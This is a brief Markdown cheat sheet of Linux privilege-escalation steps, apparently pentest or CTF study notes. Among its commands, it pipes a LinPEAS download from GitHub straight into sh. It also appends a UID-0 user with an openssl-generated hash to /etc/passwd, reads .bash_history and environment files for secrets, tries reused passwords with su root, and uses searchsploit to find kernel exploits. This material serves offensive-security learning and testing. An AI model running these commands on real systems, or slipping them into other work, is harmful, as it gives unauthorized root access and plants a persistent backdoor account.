## Have you tried this?
```
Reuse passwords with su root
```

## LinPEAS
```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md
```
## Environment
```
env : can check for any unusual variable entry
cat .bashrc: use to check if the variable is perm
cat .bash_history : used to check bash history files
```
## Password Authentication
```
Before trying, check if you have write perms to /etc/passwd
openssl passwd [whatever you want]: to create a password hash
echo "root2:[password hash]:0:0:root:/root:/bin/bash" >> /etc/passwd

escalate by logging into the new user
su root2
```
## Kernel
https://github.com/lucyoa/kernel-exploits
```
enumerate the version and system arch first
cat /etc/issue
uname -r 
arch

afterwards, use searchsploit to find relevant exploit
searchsploit "linux kernel Ubuntu xx Local Privilege Escalation"   | grep  "x." | grep -v " < x.x.x" | grep -v "x.x"
```

## Viewing softwares present in the system
```
dpkg -l
```

